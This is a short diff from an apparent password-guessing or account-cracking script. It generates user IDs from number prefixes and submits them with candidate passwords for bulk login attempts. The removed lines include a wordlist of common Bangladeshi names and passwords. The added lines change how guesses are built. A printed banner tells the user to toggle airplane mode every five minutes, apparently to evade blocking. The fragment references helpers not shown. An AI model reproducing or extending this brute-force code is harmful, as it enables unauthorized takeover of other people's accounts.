@@ -244,9 +244,8 @@ def umo_in():
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
         shoha()
         for love in user:
-            uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangla','09876543','@#@#@#','BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','Ramjan','Md Jahidul Islam','Jahidul','Shakil','Badsha','Tanjila','Rashel','Mohammad','113355','22334455','121235','1234567890']
-            yaari.submit(SAMIRM1,uid,pwx,tl)
+            pwx = [love[1:]]
+            uid = code+love
             for Eman in HamiiID:
                 pwx.append(Eman)
                 pwx.append(love)
